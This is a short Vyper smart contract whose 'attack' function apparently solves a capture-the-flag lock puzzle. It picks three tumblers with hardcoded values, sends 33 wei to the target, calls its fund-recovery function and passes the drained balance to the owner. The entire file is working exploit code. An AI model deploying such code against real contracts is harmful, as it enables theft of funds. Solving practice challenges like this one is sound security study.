# @version ^0.3.7

interface ILock:
    def passHash() -> bytes32: view
    def tumbler1() -> bool: view
    def tumbler2() -> bool: view
    def tumbler3() -> bool: view
    def opened() -> bool: view
    def pick1(passphrase: uint256): nonpayable
    def pick3(message: bytes16): nonpayable
    def recoverFunds(): nonpayable

owner: immutable(address)

lock: ILock

@external
@payable
def __init__(_lock: address):
    assert msg.value == 33, "send wei"
    owner = msg.sender
    self.lock = ILock(_lock)

@external
def attack():
    assert msg.sender == owner, "!owner"
    passphrase: uint256 = 420
    message: bytes16 = convert(0x6942, bytes16)
    self.lock.pick1(passphrase)
    assert self.lock.tumbler1(), "!tumbler1"
    raw_call(
        self.lock.address,
        method_id("pick2()"),
        value=33,
    )
    assert self.lock.tumbler2(), "!tumbler2"
    self.lock.pick3(message)
    assert self.lock.tumbler3(), "!tumbler3"
    self.lock.recoverFunds()
    assert self.lock.opened(), "!opened"
    send(owner, self.balance)
